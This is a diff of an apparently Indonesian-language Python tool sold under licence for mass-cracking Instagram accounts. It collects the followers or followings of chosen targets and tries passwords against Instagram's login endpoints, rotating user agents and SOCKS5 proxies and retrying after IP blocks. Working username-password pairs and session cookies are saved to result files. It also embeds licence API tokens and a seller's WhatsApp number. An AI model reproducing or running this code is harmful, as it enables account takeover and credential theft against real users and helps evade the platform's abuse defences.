+						self.crackAPI(user,pas)
+						loop-=1
+						break
+				except requests.exceptions.ConnectionError:
+					time.sleep(5)
+					self.crackAPI(user,pas)
+					loop-=1
+					break
+				except Exception as e:
+					pass
+					open('.logCrack','a').write(f'{N}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
+		loop+=1
+					
+				
+	def crackAPIversi2(self,user,pas):
+		global loop,success,checkpoint
+		ses = requests.Session()
+		ua = random.choice(baru)
+		sys.stdout.write(f'\r{P}[{H}#{P}] crack {H}stabil {P}{loop}/{len(internal)}{P} OK-:{H}{len(success)} {N}CP-:{K}{len(checkpoint)} {P}');sys.stdout.flush()
 		try:
 			for pw in pas:
-				xyaa_code=random.randint(1000000000, 99999999999)
-				ts = calendar.timegm(current_GMT)
-				proxy = {'http': 'socks5://'+random.choice(prox_xyaa)}
-				p = ses.get('https://z-p42.www.instagram.com/accounts/login/')
-				ses.headers.update({
-                    'Host':'z-p42.www.instagram.com',
-                    'X-IG-App-ID':'1217981644879628',
-                    'X-IG-WWW-Claim':'0',
-                    'X-Instagram-AJAX':'e776ba0cb975',
-                    'Content-Type':'application/x-www-form-urlencoded',
-                    'Accept':'*/*',
-                    'X-Requested-With':'XMLHttpRequest',
-                    'X-ASBD-ID':'198387',
-                    'User-Agent':ua,
-                    'X-CSRFToken':p.cookies['csrftoken'],
-                    'Origin':'https://z-p42.www.instagram.com',
-                    'Sec-Fetch-Site':'same-origin',
-                    'Sec-Fetch-Mode':'cors',
-                    'Sec-Fetch-Dest':'empty',
-                    'Referer':'https://z-p42.www.instagram.com/accounts/onetap/',
-                    'Accept-Encoding':'gzip, deflate, br',
-                    'Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})        
+				xxcteam = random.randint(1000000000, 99999999999)
+				jam = calendar.timegm(current_GMT)
+				proxy = {'http': 'socks5://'+random.choice(prox)}
+				p = ses.get('https://z-p15.www.instagram.com/accounts/login/?force_classic_login&hl=en')
+				head = {
+				       "Host": "z-p15.www.instagram.com",
+				       "Connection": "keep-alive",
+				       "Content-Length": "320",
+				       "X-IG-WWW-Claim": "0",
+				       "X-Instagram-AJAX": "9080db6b6a51",
+				       "Content-Type": "application/x-www-form-urlencoded",
+				       "Accept": "*/*",
+				       "X-Requested-With": "XMLHttpRequest",
+				       "X-ASBD-ID": "198387",
+				       "User-Agent": ua,
+				       "X-CSRFToken": p.cookies['csrftoken'],
+				       "X-IG-App-ID": "1217981644879628",
+				       "Origin": "https://z-p15.www.instagram.com",
+				       "Sec-Fetch-Site": "same-origin",
+				       "Sec-Fetch-Mode": "cors",
+				       "Sec-Fetch-Dest": "empty",
+				       "Referer": "https://z-p15.www.instagram.com/accounts/login/",
+				       "Accept-Encoding": "gzip, deflate",
+				       "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+				       }
 				data = {
-           "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
-			"username": user,
-			"queryParams": "{}",
-			"optIntoOneTap": 'false',
-			"stopDeletionNonce": "",
-			"trustedDeviceRecords": "{}"}
-				respon=ses.post("https://z-p42.www.instagram.com/accounts/login/ajax/", data=data, allow_redirects=True)
-				xyaa_code=json.loads(respon.text)
-				if 'userId' in str(xyaa_code):
+				      "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{jam}:{pw}",
+				      "username":user,
+				      "queryParams":"{}",
+				      "optIntoOneTap":"false",
+				      "stopDeletionNonce":"",
+				      "trustedDeviceRecords":"{}"
+				      }
+				respon=ses.post("https://z-p15.www.instagram.com/accounts/login/ajax/", headers = head, data = data, proxies = proxy, allow_redirects = False)
+				xc_team=json.loads(respon.text)
+				if "userId" in str(xc_team) or "sessionid" in ses.cookies.get_dict():
 					nama,pengikut,mengikut,postingan=self.APIinfo(user)
-					cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
-					nomor, tanggal = self.ingfo(cookie)
-					tree = Tree("")
-					tree.add(f"{P2}nama akun : {H2}{nama}").add(f"{H2}{user}|{pw}")
-					tree.add(f"{P2}followers : {H2}{pengikut}")
-					tree.add(f"{P2}following : {H2}{mengikut}")
-					tree.add(f"{P2}nomor hp  : {H2}{nomor}")
-					tree.add(f"{P2}postingan : {H2}{postingan}")
-					tree.add(f"{P2}tanggal lahir : {H2}{tanggal}").add(f"{N2}{cookie}{P2}")
-					prints(tree)
+					print("\r                                       ")
+					adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {uazku()}'
+					pepekXD = nel(adit, style='green')
+					print('\n')
+					cetak(nel(pepekXD,style='',title='\r[green]Account Login Method API V2[white]'))
 					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
 					success.append(user)
 					break
-
-				elif 'checkpoint_url' in str(xyaa_code):
+				elif 'href="https://www.instagram.com/challenge/action/"' in str(xc_team):
 					nama,pengikut,mengikut,postingan=self.APIinfo(user)
-					tree = Tree("")
-					tree.add(f"{P2}nama akun : {K2}{nama}")
-					tree.add(f"{P2}username  : {K2}{user}")
-					tree.add(f"{P2}password  : {K2}{pw}")
-					tree.add(f"{P2}followers : {K2}{pengikut}")
-					tree.add(f"{P2}following : {K2}{mengikut}")
-					tree.add(f"{P2}postingan : {K2}{postingan}\n")
-					prints(tree)
+					print("\r                                       ")
+					adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-agent: {uazku()}'
+					pepekXD = nel(adit, style='yellow')
+					print('\n')
+					cetak(nel(pepekXD,style='', title='\r[yellow]Account Check Method API V2[white]'))
 					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
 					checkpoint.append(user)
 					break
-				elif "Harap tunggu beberapa menit sebelum mencoba lagi." in str(respon.text):
-					prog.update(des,description=f"{M2}spam ip{P2} {loop}/{len(internal)} OK-:{H2}{len(success)} {P2}CP-:{K2}{len(checkpoint)}{P2}")
-					prog.advance(des)
-					time.sleep(15)
-					self.crackAPI(user,pas)
-				elif "ip_block" in str(respon.text):
-					prog.update(des,description=f"{M2}spam ip{P2} {loop}/{len(internal)} OK-:{H2}{len(success)} {P2}CP-:{K2}{len(checkpoint)}{P2}")
-					prog.advance(des)
-					time.sleep(30)
-					self.crackAPI(user,pas)
+				elif 'ip_block' in str(respon.text):
+					sys.stdout.write(f'\r{P}[{M}#{P}] crack {M}spamIP {P}{loop}/{len(internal)}{P} OK-:{H}{len(success)} {N}CP-:{K}{len(checkpoint)} {P}');sys.stdout.flush()
+					time.sleep(10)
+					self.crackAPIversi2(user,pas)
 				else:
 					continue
 			loop+=1
-		except requests.ConnectionError:
-			time.sleep(10)
+		except:
+			self.crackAPIversi2(user,pas)
+	
+	def crackAJAX(self,user,pas):
+		global loop,success,checkpoint
+		ses = requests.Session()
+		uas = random.choice(UaNgentodMuach)
+		sys.stdout.write(f'\r{P}[{H}#{P}] VINDRA-XD {H}stabil {P}{loop}/{len(internal)}{P} OK-:{H}{len(success)} {N}CP-:{K}{len(checkpoint)} {P}');sys.stdout.flush()
+		try:
+			for pw in pas:
+				xxcteam = random.randint(1000000000, 99999999999)
+				jam = calendar.timegm(current_GMT)
+				p = ses.get(str(random.choice([
+				      "https://www.secure.instagram.com/accounts/login/",
+				      "https://www.secure.instagram.com/accounts/login/?force_classic_login=&",
+				      "https://www.secure.instagram.com/accounts/login/?force_classic_login&hl=en",
+				      "https://www.secure.instagram.com/accounts/onetap/",
+				      "https://www.secure.instagram.com/accounts/onetap/?next=%2F",
+				      "https://www.secure.instagram.com/accounts/onetap/?next=/"
+				      ])))
+				head = {
+				      "Host": "www.secure.instagram.com",
+				      "Connection": "keep-alive",
+				      "Content-Length": "318",
+				      "X-IG-WWW-Claim": "0",
+				      "X-Instagram-AJAX": "9080db6b6a51",
+				      "Content-Type": "application/x-www-form-urlencoded",
+				      "Accept": "*/*",
+				      "X-Requested-With": "XMLHttpRequest",
+				      "X-ASBD-ID": "198387",
+				      "User-Agent": uas,
+				      "X-CSRFToken": p.cookies['csrftoken'],
+				      "X-IG-App-ID": "1217981644879628",
+				      "Origin": "https://www.secure.instagram.com",
+				      "Sec-Fetch-Site": "same-origin",
+				      "Sec-Fetch-Mode": "cors",
+				      "Sec-Fetch-Dest": "empty",
+				      "Referer": "https://www.secure.instagram.com/accounts/login/",
+				      "Accept-Encoding": "gzip, deflate",
+				      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+				      }
+				head2 = {
+				      "Host": "www.secure.instagram.com",
+				      "Connection": "keep-alive",
+				      "Upgrade-Insecure-Requests": "1",
+				      "User-Agent": uas,
+				      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+				      "dnt": "1",
+				      "X-Requested-With": "mark.via.gp",
+				      "Sec-Fetch-Site": "none",
+				      "Sec-Fetch-Mode": "navigate",
+				      "Sec-Fetch-User": "?1",
+				      "Sec-Fetch-Dest": "document",
+				      "Referer": "https://www.secure.instagram.com/accounts/login/",
+				      "Accept-Encoding": "gzip, deflate",
+				      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+				      }
+				param = {
+				      "Host": "www.secure.instagram.com",
+				      "Connection": "keep-alive",
+				      "Cache-Control": "max-age=0",
+				      "Upgrade-Insecure-Requests": "1",
+				      "User-Agent": uas,
+				      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+				      "X-Requested-With": "mark.via.gp",
+				      "Sec-Fetch-Site": "none",
+				      "Sec-Fetch-Mode": "navigate",
+				      "Sec-Fetch-User": "?1",
+				      "Sec-Fetch-Dest": "document",
+				      "Referer": f"https://www.secure.instagram.com/"+user+"/",
+				      "Accept-Encoding": "gzip, deflate",
+				      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+				      }
+				data = {
+				      "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{jam}:{pw}",
+				      "username":user,
+				      "queryParams":"{}",
+				      "optIntoOneTap":"false",
+				      "stopDeletionNonce":"",
+				      "trustedDeviceRecords":"{}"
+				      }
+				dateku = str(random.choice([param, head2]))
+				respon=ses.post("https://www.secure.instagram.com/accounts/login/ajax/",headers = head, data = data, allow_redirects = dateku)
+				xc_team=json.loads(respon.text)
+				if "userId" in str(xc_team) or "sessionid" in ses.cookies.get_dict():
+					nama,pengikut,mengikut,postingan=self.APIinfo(user)
+					coki = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
+					print("\r                                       ")
+					adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {uazku()}\ncookies   : {coki}'
+					pepekXD = nel(adit, style='green')
+					print('\n')
+					cetak(nel(pepekXD,style='',title='\r[green]Account Login Method AJAX[white]'))
+					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
+					success.append(user)
+					break
+				elif 'href="https://www.instagram.com/challenge/action/"' in str(xc_team):
+					nama,pengikut,mengikut,postingan=self.APIinfo(user)
+					print("\r                                       ")
+					adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-agent: {uazku()}'
+					pepekXD = nel(adit, style='yellow')
+					print('\n')
+					cetak(nel(pepekXD,style='', title='\r[yellow]Account Check Method AJAX[white]'))
+					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
+					checkpoint.append(user)
+					break
+				elif 'ip_block' in str(respon.text):
+					sys.stdout.write(f'\r{P}[{M}#{P}] crack {M}spamIP {P}{loop}/{len(internal)}{P} OK-:{H}{len(success)} {N}CP-:{K}{len(checkpoint)} {P}');sys.stdout.flush()
+					time.sleep(10)
+					self.crackAJAX(user,pas)
 
+				else:
+					continue
+			loop+=1
+		except:
+			self.crackAJAX(user,pas)
+	
 	def checkAPI(self,usr,pwd):
 		try:
 			ts = calendar.timegm(current_GMT)
-			ses=requests.Session()
-			proxy = {'http': 'socks5://'+random.choice(prox_xyaa)}
-			ua_xyaaxc = user_agentAPI()
-			token=s.get("https://z-p42.www.instagram.com/accounts/login",headers={"user-agent":self.ua_igeh()}).content
-			crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
-			s.headers.update({
-				'authority': 'www.instagram.com',
-				'connection': 'keep-alive',
-				'sec-ch-ua': '";Not A Brand";v="99", "Chromium";v="94"',
-				'x-ig-app-id': '1217981644879628',
-                'x-ig-www-claim': 'hmac.AR3jlStdcYspw88nLWvVnCDdiZ-KPvru_TasoSJlzGz-iXV2',
-                 'x-requested-with': 'XMLHttpRequest',
-				'sec-ch-ua-mobile': '?1',
-				'x-instagram-ajax': 'c6412f1b1b7b',
-				'content-type': 'application/x-www-form-urlencoded',
-				'accept': '*/*',
-				'x-csrftoken': crf_token,
-				'user-agent': ua_xyaaxc,
-				'x-asbd-id': '198387',
-				'sec-ch-ua-platform': '"Android"',
-				'origin': 'https://www.instagram.com',
-				'sec-fetch-site': 'same-origin',
-				'sec-fetch-mode': 'cors',
-				'sec-fetch-dest': 'empty',
-				'referer': 'https://www.instagram.com/',
-				'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
-			})
-
+			xyaaXD = random.randint(1000000000, 99999999999)
+			ses = requests.Session()
+			ts = calendar.timegm(current_GMT)
+			sys.stdout.write(f'\r{P}[{H}#{P}] {H}cheking {N}{usr}{P}');sys.stdout.flush()
+			response = ses.get(f"https://z-p42.www.instagram.com/accounts/login/?force_classic_login&hl=en").text
+			token = re.search('name="csrfmiddlewaretoken" value="(\\w+)"/>', str(response)).group(1)
+			head = {
+                    'Host': 'z-p42.www.instagram.com',
+                    'Connection': 'keep-alive',
+                    'Content-Length': '296',
+                    'Cache-Control': 'max-age=0',
+                    'Upgrade-Insecure-Requests': '1',
+                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36',
+                    'Origin': 'https://z-p42.www.instagram.com',
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                    'dnt': '1',
+                    'X-Requested-With': 'mark.via.gp',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Sec-Fetch-Mode': 'navigate',
+                    'Sec-Fetch-User': '?1',
+                    'Sec-Fetch-Dest': 'document',
+                    'Referer': 'https://z-p42.www.instagram.com/accounts/login/?force_classic_login&hl=en',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
+                    }
 			param={
-				"enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pwd}",
-					"username": usr,
-					"optIntoOneTap": False,
-					"queryParams": "{}",
-					"stopDeletionNonce": "",
-					"trustedDeviceRecords": "{}"
-			}
-			x=s.post("https://z-p42.www.instagram.com/accounts/login/ajax/",data=param,proxies=proxy)
-			x_jason=json.loads(x.text)
-			if "userId" in x.text:
+					'csrfmiddlewaretoken': token,
+					'username': usr,
+					'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{ts}:{pwd}'
+					}
+			respon=ses.post("https://z-p42.www.instagram.com/accounts/login/?force_classic_login&hl=en", headers = head, data = param, allow_redirects=True)
+			if "userId" in str(respon.text) or "sessionid" in ses.cookies.get_dict():
 				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
-				print(f"""
-    ├ {CY} LIVE{N}
-	├ {CY}{usr}|{pwd}
-	├ Followers {CY}{pengikut}
-	├ Following {CY}{mengikut}
-	├ Posts
-  	 ∟ jumlah Post {CY}{postingan}""")
-			elif 'checkpoint_url' in x.text:
+				print("OK")
+				print(f"{H}{usr} {P}| {H}{pwd}{P}\n")
+				open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
+			elif 'href="https://www.instagram.com/challenge/action/"' in str(respon.text):
 				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
-				print(f"""
-    ├ {K}MANGKANYA GANTENG KONTOL{N}
-	├ {K}{usr}|{pwd}
-	├ Followers {K}{pengikut}
-	├ Following {K}{mengikut}
-	├ Posts
-  	 ∟ jumlah Post {K}{postingan}""")
-			elif 'Please wait a few minutes' in str(x.text):
-				sys.stdout.write(f"\r {U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
-				self.checkAPI(usr,pwd)
+				print("CP")
+				print(f"{K}{usr} {P}| {K}{pwd}{P}\n")
+				open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
+			elif 'ip_block' in str(respon.text):
+				sys.stdout.write(f'\r {P}[{M}#{P}] {M}spamIP {N}{len(usr)}{P}');sys.stdout.flush()
+				time.sleep(5)
+				self.checkAPI(usr, pwd)
 		except:
 			self.checkAPI(usr,pwd)
 
 	def menu(self):
 		self.logo()
-		c=input(f' input 1 sampai 9 : ')
+		c=input(f'{P}[{B}?{P}] menu : {H}')
 		if c=='':
-			prints(Panel(f"{P2}pilih yang bener broo jangan kosong !",width=80,padding=(0,19),style=f"{color_table}"));time.sleep(3);exit()
+			self.menu()
+		
 		elif c in ('1','01'):
-			prints(Panel(f"{P2}maaf tools ini sedang dalam proses maintenance silahkan pilih menu lainnya",width=80,style=f"{color_table}"));sleep(2);exit()
-			mas='[!] Masukan jumlah target'
-			mas1=nel(mas,style='')
-			sol().print(mas1)
-			m=int(input(f'\n{N}[•] Jumlah : {C}'));print('')
-			mas='[•] Masukan nama random untuk di searching'
-			mas1=nel(mas,style='')
-			sol().print(mas1)
+			m=int(input(f'{P}[{B}?{P}] masukan jumlah target : {H}'))
+			prints(Panel(f"{P2}masukan nama random untuk di searching, {H2}1 {P2}nama setara dengan {H2}5000 {P2}username",width=80,padding=(0,1),style=f"#FFFFFF"))
 			for i in range(m):
 				i+1
-				nama=input(f'{N} [•] Masukan nama ({H}{len(internal)}{C}): ')
+				i+=1
+				nama=input(f'{P}[{B}?{P}] masukan nama {B}{len(internal)}{P} : {H}')
 				name=self.searchAPI(self.cookie,nama)
 			self.passwordAPI(name)
-
+			
 		elif c in ('2','02'):
-			mas=input(f' apakah anda ingin crack masal Y/t : ')
+			mas=input(f"{P}[{B}?{P}] apakah anda ingin crack massal? Y/t : {H}")
 			if mas in ['y','Y']:
 				masal(self)
 			elif mas in ['t','T']:
 				massal(self)
 			elif mas in ['']:
-				print("Y/t bro jangan kosong")
-
+				print(f"{P}[{B}?{P}] jangan kosong!")
+				exit()
 
 		elif c in ('3','03'):
-			mas=input(f' apakah anda ingin crack masal Y/t : ')
+			mas=input(f"{P}[{B}?{P}] apakah anda ingin crack massal? Y/t : {H}")
 			if mas in ['y','Y']:
 				mengi(self)
 			elif mas in ['t','T']:
 				meng(self)
 			elif mas in ['']:
-				print("Y/t bro jangan kosong")
+				print(f"{P}[{B}?{P}] jangan kosong!")
+				exit()
 
 
 		elif c in ('4','04'):
-			print('')
+			prints(Panel(f"{P2}tunggu sebentar sedang mengecek file hasil result anda",width=80,padding=(0,9),style=f"#FFFFFF"))
+			time.sleep(4)
 			for i in os.listdir('result'):
-				prints(Panel(f"{P2}hasil crack {i}",width=80,style=f"{color_table}"))
-			c=input(f' masukan nama file : ')
+				print(f'{P}[{B}+{P}] {i}')
+			c=input(f'{P}[{B}?{P}] masukan nama file : {H}')
 			g=open("result/%s"%(c)).read().splitlines()
-			print(f' total results : {H}{len(g)}{C}')
-			prints(Panel(f"{P2}proses mengecek status akun. silahkan tunggu sampai proses cek selesai",width=80,style=f"{color_table}"))
+			jalan(f'\n{P}[{B}?{P}] total result di temukan : {H}{len(g)}{P}')
+			prints(Panel(f"{P2}sedang mengecek status akun harap tunggu sebentar",width=80,padding=(0,12),style=f"#FFFFFF"))
 			for s in g:
 				usr=s.split("|")[0]
 				pwd=s.split("|")[1]
 				self.checkAPI(usr,pwd)
-			prints(Panel(f"{P2}proses cek akun selesai, silahkan jalankan ulang scriptnya python run.py",width=80,padding=(0,3),style=f"{color_table}"))
+			jalan(f"{P}[{H}✓{P}] proses check akun selesai...")
+			exit()
 
 		elif c in ('5','05'):
-			menu_bot()
-			
+			prints(Panel(f"{P2}tunggu sebentar sedang mengecek file hasil result anda",width=80,padding=(0,9),style=f"#FFFFFF"))
+			time.sleep(4)
+			for i in os.listdir('result'):
+				print(f'{P}[{B}+{P}] {i}')
+			c=input(f'{P}[{B}?{P}] masukan nama file : {H}')
+			g=open("result/%s"%(c)).read().splitlines()
+			xx=c.split("-")
+			xc=xx[0]
+			jalan(f'\n{P}[{B}?{P}] total result di temukan : {H}{len(g)}{P}')
+			for s in g:
+				usr=s.split("|")[0]
+				pwd=s.split("|")[1]
+				fol=s.split("|")[2]
+				ful=s.split("|")[3]
+				if xc=="checkpoint":
+					print(f"""
+{P}[{K}+{P}] {K}CHECK{P}
+ {P}|{P}
+ {P}├╴>{P} username  : {K}{usr}{C}
+ {P}├╴>{P} password  : {K}{pwd}{C}
+ {P}├╴>{P} followers : {K}{fol}{C}
+ {P}├╴>{P} following : {K}{ful}{C}
+ {P}      User-Agent : {ua}
+					""");sleep(0.05)
+				else:
+					print(f"""
+{P}[{H}+{P}] {H}LIVE{P}
+ {P}|{P}
+ {P}├╴>{P} username  : {H}{usr}{C}
+ {P}├╴>{P} password  : {H}{pwd}{C}
+ {P}├╴>{P} followers : {H}{fol}{C}
+ {P}├╴>{P} following : {H}{ful}{C}
+					""");sleep(0.05)
+		
 		elif c in ('6','06'):
-			global following
-			prints(Panel(f"{P2}maaf tools ini sedang dalam proses maintenance silahkan pilih menu lainnya",width=80,style=f"{color_table}"));sleep(2);exit()
-			six=0
-			print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
-			x=open('data/.kukis.log','r').read()
-			x_id=re.findall('sessionid=(\d+)',x)[0]
-			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
-			for i in following:
-				six+=1
-				sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
-				six_id=self.sixAPI(i)
-				print(f' {str(six)}{U}}}{C} {i} {H}Unfollow-Berhasil{C}')
-				self.unfollowAPI(six_id,'5452333948',self.cookie)
-				#print(w)
-			input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu()
-		elif c in ("ubah","Ubah","UBAH"):
-			change_theme()
+			print(f'{P}[{M}!{P}] bot auto unfollow sedang dalam proses maintenance')
+			time.sleep(2)
+			self.menu()
+
 		elif c in ('7','07'):
-			self.hapus_lisensi()
+			self.HapusLisen()
+			
 		elif c in ('0','00'):
 			self.Exit()
 
 		else:
 			self.menu()
 def tlisensi():
+    lu()
     cetak(nel('[!] Lisensi Tidak Valid\n[!] Silahkan Ketik [green]"Buy"[/green] Untuk membeli lisensi'))
     time.sleep(2)
     lisen=input('[•] Masukan Lisensi : ')
@@ -951,7 +1291,7 @@ def tlisensi():
      print(f'{M}[!] JANGAN KOSONG{N}');sleep(1)
      tlisensi()
     if lisen in ['buy','Buy']:
-     os.system('xdg-open https://wa.me/6285888222944?text=Bang+beli+lisensi+IG+nya+dong');exit()
+     os.system('xdg-open https://wa.me/+6281221523195?text=Bang+beli+lisensi+IG+nya+dong');exit()
     loadinglisen()
     open('.lisen.txt','w').write(lisen)
     lisensi()
@@ -963,13 +1303,14 @@ def lisensi():
  except:
   tlisensi()
  ses=requests.Session()
- res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyMzYwMTQxMSIsInA3Qld2ZWY3YTdIYjVseS9wWEJmQmxIKzB4a0gybVlEZm8rSkNUSXkiXQ==&ProductId=16362&Key='+lisensikuni[0]).json()
+ res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyODk1MzkwMyIsImVUdmdBNEZpL0RyVEFReFFwVTBhMzhaelBIaHZJbHhWQkZSSUdHRVoiXQ==&ProductId=17514&Key='+lisensikuni[0]).json()
  status=res['licenseKey']['key']
  if status ==cek:
+  li()
   cetak(nel('\t[green] SELAMAT LISENSI ANDA VALID[/green]'))
   time.sleep(2)
   lisensiku.append("sukses")
-  login_kamu()
+  ggwp17()
  elif status ==KeyError:
   os.system('rm .lisen.txt')
  else:
@@ -978,61 +1319,110 @@ def lisensi():
 def mengi(self):
 			try:
 				menudump.append('mengikuti')
-				m=int(input(f' jumlah target : {N}'))
+				prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"#FFFFFF"))
+				m=int(input(f'{P}[{B}?{P}] masukan jumlah target : {H}'))
 			except:m=1
-			prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"{color_table}"))
 			for t in range(m):
 				t +=1
-				nama=input(f' username target : {C}')
+				nama=input(f'{P}[{B}?{P}] masukan username : {H}')
 				id=self.idAPI(self.cookie,nama)
 				info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
 			self.passwordAPI(info)
 
 def meng(self):
-	try:
 		menudump.append('mengikuti')
-		prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"{color_table}"))
-		m=input(f' username target : ')
-		print(f" wait collect username {m}")
-		id=self.idAPI(self.cookie,m)
+		prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"#FFFFFF"))
+		nama=input(f'{P}[{B}?{P}] masukan username : {H}')
+		id=self.idAPI(self.cookie,nama)
 		info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
 		self.passwordAPI(info)
-	except Exception as e:
-		print(e)
 
 def masal(self):
 			try:
 				menudump.append('pengikut')
-				m=int(input(f' jumlah target : {N}'))
+				prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"#FFFFFF"))
+				m=int(input(f'{P}[{B}?{P}] masukan jumlah target : {H}'))
 			except:m=1
-			prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"{color_table}"))
 			for t in range(m):
 				t +=1
-				nama=input(f' username target : {C}')
+				nama=input(f'{P}[{B}?{P}] masukan username : {H}')
 				id=self.idAPI(self.cookie,nama)
 				info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
 			self.passwordAPI(info)
 
-
-
 def massal(self):
 			menudump.append('pengikut')
-			prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"{color_table}"))
-			m=input(f' username target : {C}')
-			print(f" wait collect username {m}")
-
+			prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"#FFFFFF"))
+			m=input(f'{P}[{B}?{P}] masukan username : {H}')
 			id=self.idAPI(self.cookie,m)
 			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
 			self.passwordAPI(info)
 
-        
-def makedirectory():
-	try:os.mkdir('data')
-	except:pass
-	try:os.system('result')
-	except:pass
-	login_kamu()
+day=datetime.now().strftime("%d-%b-%Y")
+nyMnD = 5
+nyMxD = 10
+current_GMT = time.gmtime(time.time())
 
-if __name__ == '__main__':
-	os.system("git pull")
-	makedirectory()
+def key():
+	os.system("clear");Banner___Gua__Ngab();key = input(f" {K}#{P} masukan lisensi : {H}")
+	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token===&ProductId=17890&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{P2}selamat lisensi yang anda masukan terdaftar ke server Insta Nazri XD",width=80,padding=(0,6),style=f"{color_table}"));time.sleep(4);ggwp17()
+	except KeyError:
+		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
+
+###----------[ CEK LISENSI ]---------- ###
+def cek():
+	try:x=open("data/lisensi.txt","r").read()
+	except FileNotFoundError:key()
+	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIzMjA4OTAxMyIsInRqSVB5U1dJQkFVdU1yMmFGVGk5eW5ZbnpuOWlmS3FHVjVMdG1Yb1EiXQ==&ProductId=17890&Key=%s"%(x)).json()['licenseKey']['key'];ggwp17()
+	except KeyError:
+		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
+
+###----------[ MASUK LISENSI ]---------- ###
+def key():
+	os.system("clear") 
+	Banner___Gua__Ngab()
